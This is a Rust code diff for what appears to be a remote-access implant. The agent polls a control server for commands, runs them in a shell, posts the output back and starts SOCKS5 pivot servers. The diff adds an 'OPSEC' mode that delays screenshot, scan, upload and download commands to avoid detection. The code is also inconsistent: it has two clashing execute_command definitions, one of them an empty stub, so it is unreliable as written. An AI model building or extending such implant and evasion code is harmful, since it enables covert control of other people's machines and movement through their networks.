@@ -11,7 +11,7 @@ use std::time::{Duration}; // commented out SystemTime, UNIX_EPOCH
 use reqwest::StatusCode;
 use crate::networking::egress::get_egress_ip;
 use crate::config::AgentConfig;
-use log::{info, error};
+use log::{info, error, debug};
 use std::collections::HashMap;
 use tokio::task::JoinHandle;
 use once_cell::sync::Lazy;
@@ -20,8 +20,12 @@ use crate::networking::socks5_pivot_server::Socks5PivotServer;
 use crate::networking::socks5_pivot::Socks5PivotHandler;
 use tokio::sync::mpsc;
 use std::sync::Arc;
+use crate::opsec::{OPSEC_STATE, AgentMode};
+use std::sync::Mutex;
+
 
 static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> = Lazy::new(|| TokioMutex::new(HashMap::new()));
+static QUEUED_COMMANDS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::new()));
 
 #[cfg(windows)]
 fn create_command(command: &str, args: &[&str]) -> Command {
@@ -99,6 +103,7 @@ async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
     }
 }
 
+// Send heartbeat to the server
 async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<()> {
     let url = format!("{}/api/agent/{}/heartbeat", server_addr, agent_id);
     info!("[HTTP] Sending heartbeat POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
@@ -139,6 +144,7 @@ async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, age
     Ok(())
 }
 
+// Fetch command from the server
 async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
     let url = format!("{}/api/agent/{}/command", server_addr, agent_id);
     info!("[HTTP] Sending command GET to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
@@ -172,6 +178,7 @@ async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_
     Ok(Some(cmd_resp.command))
 }
 
+// Submit result to the server
 async fn submit_result_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str, command: &str, output: &str) -> io::Result<()> {
     let url = format!("{}/api/agent/{}/result", server_addr, agent_id);
     info!("[HTTP] Sending result POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
@@ -199,6 +206,23 @@ async fn submit_result_with_client(config: &AgentConfig, server_addr: &str, agen
     Ok(())
 }
 
+// Check if the command should be executed based on the current opsec mode
+async fn should_execute_command(cmd: &str) -> bool {
+    let mode = OPSEC_STATE.lock().unwrap().mode;
+    match mode {
+        AgentMode::FullOpsec => {
+            // Only allow ultra-quiet commands, skip noisy ones
+            if cmd.starts_with("screenshot") || cmd.starts_with("scan") || cmd.starts_with("upload") {
+                log::debug!("[OPSEC] FullOpsec: Skipping noisy command: {}", cmd);
+                return false;
+            }
+            true
+        }
+        AgentMode::BackgroundOpsec => true,
+    }
+}
+
+// Main function to run the shell
 pub async fn run_shell(
     server_addr: &str,
     agent_id: &str,
@@ -232,23 +256,28 @@ pub async fn run_shell(
                         }
                     }                
                     
-                    let cmd_parts: Vec<&str> = command.split_whitespace().collect();
-                    
-                    match execute_command(&cmd_parts).await {
-                        Ok(output) => {
-                            if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &output).await {
-                                error!("[SHELL] Failed to submit result: {}", e);
-                            } else {
-                                info!("[SHELL] Result submitted successfully");
+                    if should_execute_command(&command).await {
+                        let cmd_parts: Vec<&str> = command.split_whitespace().collect();
+                        
+                        match execute_command(&cmd_parts).await {
+                            Ok(output) => {
+                                if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &output).await {
+                                    error!("[SHELL] Failed to submit result: {}", e);
+                                } else {
+                                    info!("[SHELL] Result submitted successfully");
+                                }
+                            }
+                            Err(e) => {
+                                let error_msg = format!("Command failed: {}", e);
+                                if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &error_msg).await {
+                                    error!("[SHELL] Failed to submit error result: {}", e);
+                                }
+                                error!("[SHELL] Shell error: {}. Retrying...", e);
                             }
                         }
-                        Err(e) => {
-                            let error_msg = format!("Command failed: {}", e);
-                            if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &error_msg).await {
-                                error!("[SHELL] Failed to submit error result: {}", e);
-                            }
-                            error!("[SHELL] Shell error: {}. Retrying...", e);
-                        }
+                    } else {
+                        QUEUED_COMMANDS.lock().unwrap().push(command.clone());
+                        continue;
                     }
                 }
                 None => {
@@ -258,6 +287,8 @@ pub async fn run_shell(
         }
 }
 
+// Start a pivot server on the specified port
+// This function is called when the command "pivot_start <port>" is received
 async fn start_pivot_server(
     port: u16,
     pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
@@ -276,6 +307,8 @@ async fn start_pivot_server(
     Ok(format!("Started pivot server on port {}", port))
 }
 
+// Stop a pivot server on the specified port
+// This function is called when the command "pivot_stop <port>" is received
 async fn stop_pivot_server(port: u16) -> Result<String, String> {
     let mut servers = PIVOT_SERVERS.lock().await;
     if let Some(handle) = servers.remove(&port) {
@@ -284,4 +317,38 @@ async fn stop_pivot_server(port: u16) -> Result<String, String> {
     } else {
         Err(format!("No pivot server running on port {}", port))
     }
+}
+
+fn is_noisy_command(cmd: &str) -> bool {
+    // Add more as needed
+    cmd.starts_with("screenshot") || cmd.starts_with("scan") || cmd.starts_with("upload") || cmd.starts_with("download")
+}
+
+pub async fn handle_command(command: &str) {
+    let mode = OPSEC_STATE.lock().unwrap().mode;
+    match mode {
+        AgentMode::FullOpsec => {
+            if is_noisy_command(command) {
+                debug!("[OPSEC] FullOpsec: Queuing noisy command: {}", command);
+                QUEUED_COMMANDS.lock().unwrap().push(command.to_string());
+                return;
+            }
+            // Execute quiet command immediately
+            execute_command(command).await;
+        }
+        AgentMode::BackgroundOpsec => {
+            // Execute immediately
+            execute_command(command).await;
+            // Drain and execute queued commands
+            let mut queue = QUEUED_COMMANDS.lock().unwrap();
+            for cmd in queue.drain(..) {
+                debug!("[OPSEC] BackgroundOpsec: Executing queued command: {}", cmd);
+                execute_command(&cmd).await;
+            }
+        }
+    }
+}
+
+async fn execute_command(command: &str) {
+    // Your actual command execution logic here
 }
